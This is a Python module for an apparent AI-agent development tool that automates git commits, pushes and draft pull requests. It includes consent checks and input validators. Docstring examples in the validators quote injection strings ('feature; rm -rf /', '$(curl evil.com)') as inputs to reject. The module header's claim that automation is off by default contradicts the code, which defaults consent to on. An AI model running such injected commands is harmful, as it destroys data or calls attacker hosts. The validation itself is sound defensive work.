#!/usr/bin/env python3
"""
Auto-Implement Git Integration Module

Provides Step 8 integration between /auto-implement workflow and git automation.
Integrates commit-message-generator and pr-description-generator agents with
git_operations and pr_automation libraries.

Features:
- Consent-based automation via environment variables
- Agent-driven commit message and PR description generation
- Graceful degradation with manual fallback instructions
- Security-first (validates prerequisites, no hardcoded secrets)
- Full error handling with actionable messages

Environment Variables:
    AUTO_GIT_ENABLED: Enable git operations (true/false, default: false)
    AUTO_GIT_PUSH: Enable push to remote (true/false, default: false)
    AUTO_GIT_PR: Enable PR creation (true/false, default: false)

Usage:
    from auto_implement_git_integration import execute_step8_git_operations

    result = execute_step8_git_operations(
        workflow_id='workflow-123',
        branch='feature/add-auth',
        request='Add user authentication',
        create_pr=True
    )

    if result['success']:
        print(f"Committed: {result['commit_sha']}")
        if result.get('pr_created'):
            print(f"PR created: {result['pr_url']}")

Date: 2025-11-05
Workflow: git_automation
Agent: implementer
Phase: TDD Green (implementation to make tests pass)


Design Patterns:
    See library-design-patterns skill for standardized design patterns.
    See api-integration-patterns skill for standardized design patterns.
"""

import os
import subprocess
from pathlib import Path
from typing import Dict, Any, Optional, List, Tuple

# Import existing infrastructure
from agent_invoker import AgentInvoker
from artifacts import ArtifactManager
from git_operations import auto_commit_and_push
from pr_automation import create_pull_request
from security_utils import audit_log

# Import first-run warning system (Issue #61)
try:
    from first_run_warning import should_show_warning, show_first_run_warning, FirstRunWarningError
    from user_state_manager import DEFAULT_STATE_FILE
except ImportError:
    # Fallback for testing - disable first-run warning
    def should_show_warning(state_file):
        return False
    def show_first_run_warning(state_file):
        return True

    # Exception hierarchy pattern from error-handling-patterns skill:
    # BaseException -> Exception -> AutonomousDevError -> DomainError(BaseException) -> SpecificError
    class FirstRunWarningError(Exception):
        pass

    from pathlib import Path
    DEFAULT_STATE_FILE = Path.home() / ".autonomous-dev" / "user_state.json"


# =============================================================================
# Exception Classes (Issue #93)
# =============================================================================

class BatchGitError(Exception):
    """Exception for batch git workflow errors.

    Raised when git operations fail during batch processing.
    Follows error-handling-patterns skill exception hierarchy:
    BaseException -> Exception -> BatchGitError
    """
    pass


def parse_consent_value(value: Optional[str], default: bool = True) -> bool:
    """
    Parse consent value from environment variable.

    NEW BEHAVIOR (Issue #61): Defaults to True when value is None or empty.
    This enables opt-out consent model for automatic git operations.

    Accepts various truthy values: 'true', 'yes', '1', 'y' (case-insensitive)
    Accepts various falsy values: 'false', 'no', '0', 'n' (case-insensitive)
    None or empty string uses the default parameter (defaults to True).

    Args:
        value: Environment variable value (or None if not set)
        default: Default value when value is None or empty (default: True)

    Returns:
        bool: True if value is truthy or default, False if explicitly falsy

    Examples:
        >>> parse_consent_value('true')
        True
        >>> parse_consent_value('YES')
        True
        >>> parse_consent_value('1')
        True
        >>> parse_consent_value('false')
        False
        >>> parse_consent_value(None)  # NEW: defaults to True
        True
        >>> parse_consent_value('')  # NEW: defaults to True
        True
        >>> parse_consent_value(None, default=False)  # Custom default
        False
    
See error-handling-patterns skill for exception hierarchy and error handling best practices.
"""
    # None or empty string uses default
    if value is None:
        return default

    # Strip whitespace
    value = str(value).strip()

    # Empty string after stripping uses default
    if not value:
        return default

    # Check falsy values first (explicit opt-out)
    falsy_values = {'false', 'no', '0', 'n'}
    if value.lower() in falsy_values:
        return False

    # Check truthy values (explicit opt-in)
    truthy_values = {'true', 'yes', '1', 'y'}
    if value.lower() in truthy_values:
        return True

    # Unknown value - use default
    return default


def check_consent_via_env(_skip_first_run_warning: bool = False) -> Dict[str, bool]:
    """
    Check user consent for git operations via environment variables.

    NEW BEHAVIOR (Issue #61): Defaults to True when env vars not set.
    This enables opt-out consent model for automatic git operations.

    Reads three environment variables:
    - AUTO_GIT_ENABLED: Master switch for git operations (default: True)
    - AUTO_GIT_PUSH: Enable push to remote (default: True)
    - AUTO_GIT_PR: Enable PR creation (default: True)

    Priority: env vars > state file > defaults (now True)

    If AUTO_GIT_ENABLED=false, all operations are disabled regardless of
    other settings.

    Returns:
        Dict with consent flags:
            - enabled: Whether git operations are enabled
            - push: Whether push is enabled (requires enabled)
            - pr: Whether PR creation is enabled (requires push)
            - git_enabled: Alias for enabled (backward compatibility)
            - push_enabled: Alias for push (backward compatibility)
            - pr_enabled: Alias for pr (backward compatibility)
            - all_enabled: True only if all three are enabled

    Examples:
        >>> # No env vars set - defaults to True (NEW!)
        >>> consent = check_consent_via_env()
        >>> consent['enabled']
        True

        >>> # Explicit opt-out
        >>> os.environ['AUTO_GIT_ENABLED'] = 'false'
        >>> consent = check_consent_via_env()
        >>> consent['enabled']
        False
    """
    # STEP 1: Check if first-run warning should be shown (Issue #61)
    # This happens BEFORE checking environment variables to ensure informed consent
    # In batch mode, skip first-run warning (Issue #93)
    if not _skip_first_run_warning and should_show_warning(DEFAULT_STATE_FILE):
        try:
            user_accepted = show_first_run_warning(DEFAULT_STATE_FILE)
            if not user_accepted:
                # User explicitly opted out - return disabled state
                audit_log(
                    "first_run_consent",
                    "declined",
                    {
                        "component": "auto_implement_git_integration",
                        "user_choice": "opted_out"
                    }
                )
                return {
                    'enabled': False,
                    'push': False,
                    'pr': False,
                    'git_enabled': False,
                    'push_enabled': False,
                    'pr_enabled': False,
                    'all_enabled': False
                }
            else:
                audit_log(
                    "first_run_consent",
                    "accepted",
                    {
                        "component": "auto_implement_git_integration",
                        "user_choice": "accepted"
                    }
                )
        except FirstRunWarningError as e:
            # Warning failed - default to disabled for safety
            audit_log(
                "first_run_warning_error",
                "failure",
                {
                    "component": "auto_implement_git_integration",
                    "error": str(e)
                }
            )
            # Fall back to env var checking below

    # STEP 2: Read environment variables (defaults to True per Issue #61)
    # Environment variables override first-run consent for flexibility
    git_enabled = parse_consent_value(os.environ.get('AUTO_GIT_ENABLED'))
    push_enabled = parse_consent_value(os.environ.get('AUTO_GIT_PUSH'))
    pr_enabled = parse_consent_value(os.environ.get('AUTO_GIT_PR'))

    # STEP 3: Audit log consent decision (Issue #96 - reviewer feedback)
    audit_log(
        "consent_bypass",
        "environment_check",
        {
            "component": "auto_implement_step5",
            "git_enabled": git_enabled,
            "push_enabled": push_enabled,
            "pr_enabled": pr_enabled,
            "source": "environment_variables"
        }
    )

    # If git is disabled, everything is disabled
    if not git_enabled:
        audit_log(
            "git_automation",
            "disabled",
            {"reason": "AUTO_GIT_ENABLED=false or opted out"}
        )
        return {
            'enabled': False,
            'push': False,
            'pr': False,
            'git_enabled': False,  # Backward compatibility
            'push_enabled': False,  # Backward compatibility
            'pr_enabled': False,  # Backward compatibility
            'all_enabled': False
        }

    # Return actual values
    return {
        'enabled': git_enabled,
        'push': push_enabled,
        'pr': pr_enabled,
        'git_enabled': git_enabled,  # Backward compatibility
        'push_enabled': push_enabled,  # Backward compatibility
        'pr_enabled': pr_enabled,  # Backward compatibility
        'all_enabled': git_enabled and push_enabled and pr_enabled
    }


def invoke_commit_message_agent(
    workflow_id: str,
    request: str,
    staged_files: Optional[List[str]] = None
) -> Dict[str, Any]:
    """
    Invoke commit-message-generator agent to create commit message.

    Args:
        workflow_id: Unique workflow identifier
        request: Feature request description
        staged_files: Optional list of staged files to include in context

    Returns:
        Dict with:
            - success: Whether agent succeeded
            - output: Generated commit message (if success)
            - error: Error message (if failed)

    Raises:
        ValueError: If workflow_id or request are empty/None

    Examples:
        >>> result = invoke_commit_message_agent(
        ...     workflow_id='workflow-123',
        ...     request='Add user authentication'
        ... )
        >>> if result['success']:
        ...     print(result['output'])
        feat: add user authentication
    """
    # Validate inputs
    if not workflow_id or (isinstance(workflow_id, str) and not workflow_id.strip()):
        raise ValueError('workflow_id cannot be empty')
    if not request or (isinstance(request, str) and not request.strip()):
        raise ValueError('request cannot be empty')

    try:
        # Initialize artifact manager to check prerequisites
        # commit-message-generator agent requires artifacts to exist
        artifact_mgr = ArtifactManager()

        # Verify we can read artifacts (will raise FileNotFoundError if missing)
        # This is a prerequisite check before invoking the agent
        # Note: read_artifact might not exist or take different params depending on version
        if hasattr(artifact_mgr, 'read_artifact'):
            artifact_mgr.read_artifact('manifest')  # Will raise FileNotFoundError if missing

        # Initialize agent invoker
        invoker = AgentInvoker()

        # Prepare context
        context = {'request': request}
        if staged_files:
            context['staged_files'] = staged_files

        # Invoke agent
        result = invoker.invoke(
            'commit-message-generator',
            workflow_id,
            **context
        )

        return result

    except TimeoutError as e:
        return {
            'success': False,
            'output': '',
            'error': f'Agent timeout: commit-message-generator did not respond ({str(e)})'
        }
    except FileNotFoundError as e:
        # Handle missing artifacts
        if 'manifest' in str(e).lower():
            return {
                'success': False,
                'output': '',
                'error': f'Required artifact not found: {str(e)}'
            }
        raise
    except Exception as e:
        return {
            'success': False,
            'output': '',
            'error': f'Agent invocation failed: {str(e)}'
        }


def invoke_pr_description_agent(
    workflow_id: str,
    branch: str
) -> Dict[str, Any]:
    """
    Invoke pr-description-generator agent to create PR description.

    Args:
        workflow_id: Unique workflow identifier
        branch: Feature branch name

    Returns:
        Dict with:
            - success: Whether agent succeeded
            - output: Generated PR description (if success)
            - error: Error message (if failed)

    Raises:
        ValueError: If workflow_id or branch are empty/None

    Examples:
        >>> result = invoke_pr_description_agent(
        ...     workflow_id='workflow-123',
        ...     branch='feature/add-auth'
        ... )
        >>> if result['success']:
        ...     print(result['output'])
        ## Summary
        - Implemented user authentication
    """
    # Validate inputs
    if not workflow_id or (isinstance(workflow_id, str) and not workflow_id.strip()):
        raise ValueError('workflow_id cannot be empty')
    if not branch or (isinstance(branch, str) and not branch.strip()):
        raise ValueError('branch cannot be empty')

    try:
        # Initialize artifact manager to check prerequisites
        artifact_mgr = ArtifactManager()

        # Verify we can read artifacts (will raise FileNotFoundError if missing)
        if hasattr(artifact_mgr, 'read_artifact'):
            artifact_mgr.read_artifact('manifest')  # Will raise FileNotFoundError if missing

        # Initialize agent invoker
        invoker = AgentInvoker()

        # Invoke agent
        result = invoker.invoke(
            'pr-description-generator',
            workflow_id,
            branch=branch
        )

        return result

    except TimeoutError as e:
        return {
            'success': False,
            'output': '',
            'error': f'Agent timeout: pr-description-generator did not respond ({str(e)})'
        }
    except FileNotFoundError as e:
        # Handle missing artifacts
        if 'manifest' in str(e).lower():
            return {
                'success': False,
                'output': '',
                'error': f'Required artifact not found: {str(e)}'
            }
        raise
    except Exception as e:
        return {
            'success': False,
            'output': '',
            'error': f'Agent invocation failed: {str(e)}'
        }


def validate_agent_output(
    agent_result: Dict[str, Any],
    agent_name: str
) -> Tuple[bool, str]:
    """
    Validate agent output is usable.

    Checks:
    - 'success' key exists and is True
    - 'output' key exists and is non-empty
    - Output is not just whitespace

    Args:
        agent_result: Result dictionary from agent invocation
        agent_name: Name of agent (for error messages)

    Returns:
        Tuple of (is_valid, error_message)
            - (True, '') if valid
            - (False, error_message) if invalid

    Examples:
        >>> result = {'success': True, 'output': 'feat: add feature', 'error': ''}
        >>> is_valid, error = validate_agent_output(result, 'commit-message-generator')
        >>> is_valid
        True
    """
    # Check if result has success key
    if 'success' not in agent_result:
        return (False, f'{agent_name} returned invalid format (missing success key)')

    # Check if agent succeeded
    if not agent_result['success']:
        error = agent_result.get('error', 'Unknown error')
        return (False, f'{agent_name} failed: {error}')

    # Check if output exists
    if 'output' not in agent_result:
        return (False, f'{agent_name} returned invalid format (missing output key)')

    # Check if output is non-empty
    output = agent_result['output']
    if not output or not str(output).strip():
        return (False, f'{agent_name} returned empty output')

    return (True, '')


def build_manual_git_instructions(
    branch: str,
    commit_message: str,
    include_push: bool = False
) -> str:
    """
    Build manual git instructions for user to execute.

    Args:
        branch: Git branch name
        commit_message: Commit message to use
        include_push: Whether to include push instructions

    Returns:
        Formatted string with manual git commands

    Examples:
        >>> instructions = build_manual_git_instructions(
        ...     branch='main',
        ...     commit_message='feat: add feature'
        ... )
        >>> 'git add' in instructions
        True
        >>> 'git commit' in instructions
        True
    """
    # Escape single quotes in commit message for shell
    safe_message = commit_message.replace("'", "'\\''")

    instructions = """
Manual Git Instructions:

1. Stage your changes:
   git add .

2. Commit with the following message:
   git commit -m '{message}'
""".format(message=safe_message)

    if include_push:
        instructions += """
3. Push to remote:
   git push origin {branch}
""".format(branch=branch)

    return instructions.strip()


def build_fallback_pr_command(
    branch: str,
    base_branch: str,
    title: str,
    body: Optional[str] = None,
    draft: bool = True
) -> str:
    """
    Build fallback gh pr create command for manual execution.

    Args:
        branch: Source branch name
        base_branch: Target branch name (e.g., 'main')
        title: PR title
        body: Optional PR body
        draft: Create as draft PR

    Returns:
        Formatted gh CLI command string

    Examples:
        >>> cmd = build_fallback_pr_command(
        ...     branch='feature/add-auth',
        ...     base_branch='main',
        ...     title='feat: add authentication'
        ... )
        >>> 'gh pr create' in cmd
        True
        >>> '--base main' in cmd
        True
    """
    # Escape quotes in title
    safe_title = title.replace('"', '\\"')

    # Build base command
    cmd = f'gh pr create --title "{safe_title}" --base {base_branch} --head {branch}'

    # Add draft flag
    if draft:
        cmd += ' --draft'

    # Add body if provided
    if body:
        # For body, suggest using heredoc or --body-file for multiline
        cmd += ' --body "$(cat <<\'EOF\'\n{body}\nEOF\n)"'.format(body=body)

    return cmd


def validate_git_state() -> bool:
    """
    Validate git repository state before operations.

    Checks for:
    - Detached HEAD state
    - Protected branches (main, master)
    - Not in a git repository

    Returns:
        True if state is valid for git operations

    Raises:
        ValueError: If git state is invalid

    Security:
        - Logs validation events to audit log
        - Prevents operations on protected branches

    Example:
        >>> validate_git_state()
        True
    """
    try:
        # Check if in a git repository
        result = subprocess.run(
            ['git', 'rev-parse', '--is-inside-work-tree'],
            capture_output=True,
            text=True,
            timeout=10,
            check=False,
        )

        if result.returncode != 0:
            audit_log(
                event_type='git_state_validation',
                status='rejected',
                context={'reason': 'Not a git repository'},
            )
            raise ValueError(
                'Not a git repository\n'
                'Expected: Run this command inside a git repository\n'
                'Initialize with: git init'
            )

    except subprocess.TimeoutExpired:
        raise ValueError('Git command timed out')

    # Get current branch name
    try:
        result = subprocess.run(
            ['git', 'rev-parse', '--abbrev-ref', 'HEAD'],
            capture_output=True,
            text=True,
            timeout=10,
            check=True,
        )
        branch_name = result.stdout.strip()

    except subprocess.TimeoutExpired:
        raise ValueError('Git command timed out')
    except subprocess.CalledProcessError as e:
        raise ValueError(f'Failed to get branch name: {e}')

    # Check for detached HEAD
    if 'HEAD' in branch_name and 'detached' in branch_name.lower():
        audit_log(
            event_type='git_state_validation',
            status='rejected',
            context={'reason': 'Detached HEAD state', 'branch': branch_name},
        )
        raise ValueError(
            'Cannot perform git operations in detached HEAD state\n'
            'Expected: Switch to a branch first\n'
            'Example: git checkout -b feature/my-feature'
        )

    # Also check git status for detached HEAD message
    try:
        result = subprocess.run(
            ['git', 'status', '--short', '--branch'],
            capture_output=True,
            text=True,
            timeout=10,
            check=True,
        )
        status_output = result.stdout

        if 'HEAD detached' in status_output or 'detached at' in status_output.lower():
            audit_log(
                event_type='git_state_validation',
                status='rejected',
                context={'reason': 'Detached HEAD detected in status'},
            )
            raise ValueError(
                'Cannot perform git operations in detached HEAD state\n'
                'Expected: Switch to a branch first\n'
                'Example: git checkout -b feature/my-feature'
            )

    except subprocess.TimeoutExpired:
        raise ValueError('Git status command timed out')
    except subprocess.CalledProcessError as e:
        raise ValueError(f'Failed to get git status: {e}')

    # Check for protected branches
    protected_branches = ['main', 'master']
    if branch_name in protected_branches:
        audit_log(
            event_type='git_state_validation',
            status='rejected',
            context={'reason': 'Protected branch', 'branch': branch_name},
        )
        raise ValueError(
            f'Cannot perform automated commits on protected branch: {branch_name}\n'
            f'Expected: Create a feature branch first\n'
            f'Example: git checkout -b feature/my-feature'
        )

    # Log successful validation
    audit_log(
        event_type='git_state_validation',
        status='success',
        context={'branch': branch_name},
    )

    return True


def validate_branch_name(branch_name: str) -> str:
    """
    Validate branch name against security rules.

    Prevents:
    - CWE-78: Command injection via shell metacharacters
    - Excessive length (>255 characters)
    - Invalid characters

    Args:
        branch_name: Branch name to validate

    Returns:
        Validated branch name (unchanged if valid)

    Raises:
        ValueError: If branch name is invalid

    Security:
        - Whitelist: alphanumeric, dash, underscore, slash only
        - Rejects shell metacharacters: $, `, |, &, ;, >, <, (, ), {, }
        - Logs validation events to audit log

    Example:
        >>> validate_branch_name('feature/add-auth')
        'feature/add-auth'
        >>> validate_branch_name('feature; rm -rf /')
        ValueError: Invalid branch name
    """
    # Check length
    if len(branch_name) > 255:
        audit_log(
            event_type='branch_name_validation',
            status='rejected',
            context={'reason': 'Branch name too long', 'length': len(branch_name)},
        )
        raise ValueError(
            f'Branch name too long: {len(branch_name)} characters\n'
            f'Expected: Maximum 255 characters'
        )

    # Check for shell metacharacters (CWE-78 prevention)
    dangerous_chars = ['$', '`', '|', '&', ';', '>', '<', '(', ')', '{', '}']
    for char in dangerous_chars:
        if char in branch_name:
            audit_log(
                event_type='branch_name_validation',
                status='rejected',
                context={
                    'reason': 'Invalid characters (shell metacharacter)',
                    'character': char,
                    'branch_name': branch_name,
                },
            )
            raise ValueError(
                f'Invalid characters in branch name: {char}\n'
                f'Expected: alphanumeric, dash, underscore, slash only'
            )

    # Whitelist validation: only allow alphanumeric, dash, underscore, slash, dot
    import re
    if not re.match(r'^[a-zA-Z0-9/._-]+$', branch_name):  # Added dot for release/v1.2.3
        audit_log(
            event_type='branch_name_validation',
            status='rejected',
            context={'reason': 'Invalid branch name format', 'branch_name': branch_name},
        )
        raise ValueError(
            f'Invalid branch name: {branch_name}\n'
            f'Expected: alphanumeric, dash, underscore, slash, dot only'
        )

    # Log successful validation
    audit_log(
        event_type='branch_name_validation',
        status='success',
        context={'branch_name': branch_name},
    )

    return branch_name


def validate_commit_message(message: str) -> str:
    """
    Validate commit message against security rules.

    Prevents:
    - CWE-78: Command injection via shell metacharacters
    - CWE-117: Log injection via newlines and control characters
    - Excessive length (>10000 characters)

    Args:
        message: Commit message to validate

    Returns:
        Validated message (unchanged if valid)

    Raises:
        ValueError: If message is invalid

    Security:
        - Rejects shell metacharacters in first line: $, `, |, &, ;
        - Rejects null bytes and control characters (log injection)
        - Length limit: 10000 characters
        - Logs validation events to audit log

    Example:
        >>> validate_commit_message('feat: add authentication')
        'feat: add authentication'
        >>> validate_commit_message('feat: auth\\n$(curl evil.com)')
        ValueError: Invalid commit message
    """
    # Check length
    if len(message) > 10000:
        audit_log(
            event_type='commit_message_validation',
            status='rejected',
            context={'reason': 'Commit message too long', 'length': len(message)},
        )
        raise ValueError(
            f'Commit message too long: {len(message)} characters\n'
            f'Expected: Maximum 10000 characters'
        )

    # Check for null bytes (CWE-117: log injection)
    if '\x00' in message:
        audit_log(
            event_type='commit_message_validation',
            status='rejected',
            context={'reason': 'Null byte detected (log injection attempt)'},
        )
        raise ValueError(
            'Invalid commit message: contains null byte\n'
            'Expected: No control characters'
        )

    # Check first line for shell metacharacters (CWE-78 prevention)
    # Note: We only check first line to allow markdown formatting in body
    first_line = message.split('\n')[0]
    dangerous_chars = ['$', '`', '|', '&', ';']
    for char in dangerous_chars:
        if char in first_line:
            audit_log(
                event_type='commit_message_validation',
                status='rejected',
                context={
                    'reason': 'Shell metacharacter in first line',
                    'character': char,
                },
            )
            raise ValueError(
                f'Invalid commit message: contains shell metacharacter {char}\n'
                f'Expected: No shell metacharacters in first line'
            )

    # Check for log injection patterns (CWE-117)
    # Reject messages that look like fake log entries
    log_patterns = [
        '\nINFO:',
        '\nWARNING:',
        '\nERROR:',
        '\nDEBUG:',
        '\r\nINFO:',
        '\r\nERROR:',
    ]
    for pattern in log_patterns:
        if pattern in message:
            audit_log(
                event_type='commit_message_validation',
                status='rejected',
                context={'reason': 'Log injection pattern detected', 'pattern': pattern},
            )
            raise ValueError(
                f'Invalid commit message: contains log injection pattern\n'
                f'Expected: No fake log entries'
            )

    # Log successful validation
    audit_log(
        event_type='commit_message_validation',
        status='success',
        context={'message_length': len(message)},
    )

    return message


def check_git_credentials() -> bool:
    """
    Check git and gh CLI credentials are configured.

    Validates:
    - git user.name is configured
    - git user.email is configured
    - gh CLI is authenticated (optional, for PR creation)

    Returns:
        True if credentials are valid

    Raises:
        ValueError: If credentials are missing or invalid

    Security:
        - Logs validation events to audit log
        - Does not expose credentials in logs

    Example:
        >>> check_git_credentials()
        True
    """
    # Check git user.name
    try:
        result = subprocess.run(
            ['git', 'config', 'user.name'],
            capture_output=True,
            text=True,
            timeout=10,
            check=False,
        )

        if result.returncode != 0 or not result.stdout.strip():
            audit_log(
                event_type='git_credentials_check',
                status='rejected',
                context={'reason': 'Git user.name not configured'},
            )
            raise ValueError(
                'Git user.name not configured\n'
                'Expected: Set git user.name\n'
                'Example: git config --global user.name "Your Name"'
            )

    except subprocess.TimeoutExpired:
        raise ValueError('Git config command timed out')

    # Check git user.email
    try:
        result = subprocess.run(
            ['git', 'config', 'user.email'],
            capture_output=True,
            text=True,
            timeout=10,
            check=False,
        )

        if result.returncode != 0 or not result.stdout.strip():
            audit_log(
                event_type='git_credentials_check',
                status='rejected',
                context={'reason': 'Git user.email not configured'},
            )
            raise ValueError(
                'Git user.email not configured\n'
                'Expected: Set git user.email\n'
                'Example: git config --global user.email "you@example.com"'
            )

    except subprocess.TimeoutExpired:
        raise ValueError('Git config command timed out')

    # Check gh CLI authentication (optional, only warn)
    try:
        result = subprocess.run(
            ['gh', 'auth', 'status'],
            capture_output=True,
            text=True,
            timeout=10,
            check=False,
        )

        if result.returncode != 0:
            audit_log(
                event_type='git_credentials_check',
                status='warning',
                context={'reason': 'gh CLI not authenticated (PR creation will fail)'},
            )
            # Don't raise - this is only required for PR creation
            # Instead, let the PR creation step handle this error
            raise ValueError(
                'gh CLI not authenticated\n'
                'Expected: Authenticate gh CLI for PR creation\n'
                'Example: gh auth login'
            )

    except subprocess.TimeoutExpired:
        raise ValueError('gh auth status command timed out')
    except FileNotFoundError:
        # gh not installed - this is OK, just won't create PRs
        audit_log(
            event_type='git_credentials_check',
            status='warning',
            context={'reason': 'gh CLI not installed'},
        )
        raise ValueError(
            'gh CLI not installed\n'
            'Expected: Install gh CLI for PR creation\n'
            'See: https://cli.github.com'
        )

    # Log successful validation
    audit_log(
        event_type='git_credentials_check',
        status='success',
        context={},
    )

    return True


def check_git_available() -> bool:
    """
    Check if git CLI is available.

    Returns:
        bool: True if git is installed and working, False otherwise

    Examples:
        >>> if not check_git_available():
        ...     print("Install git first")
    """
    try:
        result = subprocess.run(
            ['git', '--version'],
            capture_output=True,
            text=True,
            timeout=5
        )
        return result.returncode == 0
    except (FileNotFoundError, subprocess.CalledProcessError, subprocess.TimeoutExpired):
        return False


def check_gh_available(check_auth: bool = False) -> bool:
    """
    Check if gh CLI is available.

    Args:
        check_auth: Also check if gh is authenticated

    Returns:
        bool: True if gh is installed (and authenticated if check_auth=True)

    Examples:
        >>> if not check_gh_available(check_auth=True):
        ...     print("Run: gh auth login")
    """
    try:
        # Check if gh is installed
        result = subprocess.run(
            ['gh', '--version'],
            capture_output=True,
            text=True,
            timeout=5
        )
        if result.returncode != 0:
            return False

        # Optionally check authentication
        if check_auth:
            auth_result = subprocess.run(
                ['gh', 'auth', 'status'],
                capture_output=True,
                text=True,
                timeout=5
            )
            return auth_result.returncode == 0

        return True
    except (FileNotFoundError, subprocess.CalledProcessError, subprocess.TimeoutExpired):
        return False


def format_error_message(
    stage: str,
    error: str,
    next_steps: Optional[List[str]] = None,
    context: Optional[Dict[str, Any]] = None,
    include_docs_link: bool = False
) -> str:
    """
    Format helpful error message with context and next steps.

    Args:
        stage: Stage where error occurred (e.g., 'commit-message-generator')
        error: Error message
        next_steps: Optional list of suggested next steps
        context: Optional context dictionary (e.g., branch, commit_sha)
        include_docs_link: Whether to include documentation link

    Returns:
        Formatted error message string

    Examples:
        >>> error = format_error_message(
        ...     stage='git_operations',
        ...     error='Not a git repository',
        ...     next_steps=['Initialize: git init']
        ... )
        >>> 'git_operations' in error
        True
        >>> 'git init' in error
        True
    """
    message = f"\n{'='*60}\n"
    message += f"Error in {stage}\n"
    message += f"{'='*60}\n\n"
    message += f"What went wrong:\n  {error}\n"

    # Add context if provided
    if context:
        message += f"\nContext:\n"
        for key, value in context.items():
            message += f"  {key}: {value}\n"

    # Add next steps if provided
    if next_steps:
        message += f"\nNext steps:\n"
        for i, step in enumerate(next_steps, 1):
            message += f"  {i}. {step}\n"

    # Add docs link if requested
    if include_docs_link:
        message += f"\nDocumentation:\n"
        message += f"  See docs/DEVELOPMENT.md for git setup instructions\n"

    return message


def create_commit_with_agent_message(
    workflow_id: str,
    request: str,
    branch: str,
    push: bool = False
) -> Dict[str, Any]:
    """
    Create git commit using agent-generated message.

    Workflow:
    1. Invoke commit-message-generator agent
    2. Validate agent output
    3. Execute git commit using git_operations.auto_commit_and_push()

    Args:
        workflow_id: Unique workflow identifier
        request: Feature request description
        branch: Git branch name
        push: Whether to push after committing

    Returns:
        Dict with:
            - success: Whether commit succeeded
            - commit_sha: Commit SHA (if success)
            - pushed: Whether pushed to remote (if success and push=True)
            - commit_message_generated: Generated commit message
            - agent_succeeded: Whether agent invocation succeeded
            - git_succeeded: Whether git operations succeeded
            - error: Error message (if failed)
            - manual_instructions: Manual fallback (if failed)

    Examples:
        >>> result = create_commit_with_agent_message(
        ...     workflow_id='workflow-123',
        ...     request='Add authentication',
        ...     branch='main',
        ...     push=True
        ... )
        >>> if result['success']:
        ...     print(f"Committed: {result['commit_sha']}")
    """
    # Step 1: Invoke commit-message-generator
    agent_result = invoke_commit_message_agent(
        workflow_id=workflow_id,
        request=request
    )

    # Validate agent output
    is_valid, validation_error = validate_agent_output(
        agent_result,
        'commit-message-generator'
    )

    if not is_valid:
        # Agent failed - provide manual instructions
        return {
            'success': False,
            'commit_sha': '',
            'pushed': False,
            'commit_message_generated': '',
            'agent_succeeded': False,
            'git_succeeded': False,
            'error': validation_error,
            'manual_instructions': build_manual_git_instructions(
                branch=branch,
                commit_message=f'feat: {request}',  # Fallback message
                include_push=push
            ),
            'fallback_available': True
        }

    # Step 2: Extract commit message
    commit_message = agent_result['output'].strip()

    # Step 3: Execute git operations
    git_result = auto_commit_and_push(
        commit_message=commit_message,
        branch=branch,
        push=push
    )

    # Build response
    if git_result['success']:
        return {
            'success': True,
            'commit_sha': git_result['commit_sha'],
            'pushed': git_result.get('pushed', False),
            'commit_message_generated': commit_message,
            'agent_succeeded': True,
            'git_succeeded': True,
            'error': ''
        }
    else:
        # Git operations failed but agent succeeded
        return {
            'success': False,
            'commit_sha': '',
            'pushed': False,
            'commit_message_generated': commit_message,
            'agent_succeeded': True,
            'git_succeeded': False,
            'error': git_result.get('error', 'Git operations failed'),
            'manual_instructions': build_manual_git_instructions(
                branch=branch,
                commit_message=commit_message,
                include_push=push
            ),
            'fallback_available': True
        }


def push_and_create_pr(
    workflow_id: str,
    branch: str,
    base_branch: str,
    title: str,
    commit_sha: str
) -> Dict[str, Any]:
    """
    Create pull request using agent-generated description.

    Workflow:
    1. Check consent for PR creation
    2. Invoke pr-description-generator agent
    3. Validate agent output
    4. Execute PR creation using pr_automation.create_pull_request()

    Args:
        workflow_id: Unique workflow identifier
        branch: Source branch name
        base_branch: Target branch name (e.g., 'main')
        title: PR title
        commit_sha: Commit SHA to reference

    Returns:
        Dict with:
            - success: Whether PR was created
            - pr_url: PR URL (if success)
            - pr_number: PR number (if success)
            - skipped: Whether PR creation was skipped (consent not given)
            - reason: Reason for skipping (if skipped)
            - agent_invoked: Whether agent was invoked
            - error: Error message (if failed)
            - fallback_command: Manual gh command (if failed)

    Examples:
        >>> result = push_and_create_pr(
        ...     workflow_id='workflow-123',
        ...     branch='feature/add-auth',
        ...     base_branch='main',
        ...     title='feat: add authentication',
        ...     commit_sha='abc1234'
        ... )
        >>> if result['pr_created']:
        ...     print(result['pr_url'])
    """
    # Check consent
    consent = check_consent_via_env()

    if not consent['pr_enabled']:
        return {
            'success': True,
            'skipped': True,
            'reason': 'User consent not provided (AUTO_GIT_PR=false)',
            'agent_invoked': False,
            'pr_created': False,
            'pr_url': '',
            'pr_number': None
        }

    # Step 1: Invoke pr-description-generator
    agent_result = invoke_pr_description_agent(
        workflow_id=workflow_id,
        branch=branch
    )

    # Validate agent output
    is_valid, validation_error = validate_agent_output(
        agent_result,
        'pr-description-generator'
    )

    if not is_valid:
        # Agent failed - provide fallback command
        fallback_cmd = build_fallback_pr_command(
            branch=branch,
            base_branch=base_branch,
            title=title
        )

        return {
            'success': False,
            'agent_invoked': True,
            'pr_created': False,
            'error': validation_error,
            'fallback_command': fallback_cmd,
            'pr_url': '',
            'pr_number': None
        }

    # Step 2: Extract PR description
    pr_body = agent_result['output'].strip()

    # Step 3: Create PR
    try:
        pr_result = create_pull_request(
            title=title,
            body=pr_body,
            draft=True,
            base=base_branch,
            head=branch
        )

        if pr_result['success']:
            return {
                'success': True,
                'pr_created': True,
                'pr_url': pr_result['pr_url'],
                'pr_number': pr_result['pr_number'],
                'agent_invoked': True,
                'error': ''
            }
        else:
            # PR creation failed
            fallback_cmd = build_fallback_pr_command(
                branch=branch,
                base_branch=base_branch,
                title=title,
                body=pr_body
            )

            return {
                'success': False,
                'pr_created': False,
                'agent_invoked': True,
                'error': pr_result.get('error', 'PR creation failed'),
                'fallback_command': fallback_cmd,
                'pr_url': '',
                'pr_number': None
            }

    except Exception as e:
        # Exception during PR creation
        fallback_cmd = build_fallback_pr_command(
            branch=branch,
            base_branch=base_branch,
            title=title,
            body=pr_body
        )

        return {
            'success': False,
            'pr_created': False,
            'agent_invoked': True,
            'error': f'PR creation exception: {str(e)}',
            'fallback_command': fallback_cmd,
            'pr_url': '',
            'pr_number': None
        }


def execute_git_workflow(
    workflow_id: str,
    request: str,
    branch: Optional[str] = None,
    push: Optional[bool] = None,
    create_pr: bool = False,
    base_branch: str = 'main',
    in_batch_mode: bool = False
